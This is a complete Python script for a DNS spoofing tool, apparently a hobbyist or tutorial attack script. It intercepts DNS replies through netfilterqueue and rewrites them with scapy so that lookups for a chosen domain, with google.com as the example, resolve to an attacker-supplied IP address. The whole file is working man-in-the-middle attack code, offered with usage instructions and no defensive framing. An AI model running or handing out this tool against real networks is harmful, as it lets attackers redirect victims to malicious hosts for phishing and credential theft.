#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue as nq
from argparse import ArgumentParser, RawDescriptionHelpFormatter
import textwrap

def get_args():
    parser = ArgumentParser(description="\u001b[32;1m=======================DNS SPOOFER========================", formatter_class=RawDescriptionHelpFormatter, epilog=textwrap.dedent('''
    \u001b[38;5;43mExample:
        $ ./aptables.sh
        $ python dns_spoof.py --address "www.google.com" --rdata "10.0.2.15"
        '''))
    parser.add_argument("-a", "--address", dest="targetaddress", help="Target address to spoof.")
    parser.add_argument("-r", "--rdata", dest="rdata", help="Spoof adress where target will be redirected.")
    args = parser.parse_args()
    return args

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if args.targetaddress in qname.decode():
            print("[*] Spoofing target...") 
            answer = scapy.DNSRR(rrname=qname, rdata=args.rdata)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

args = get_args()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()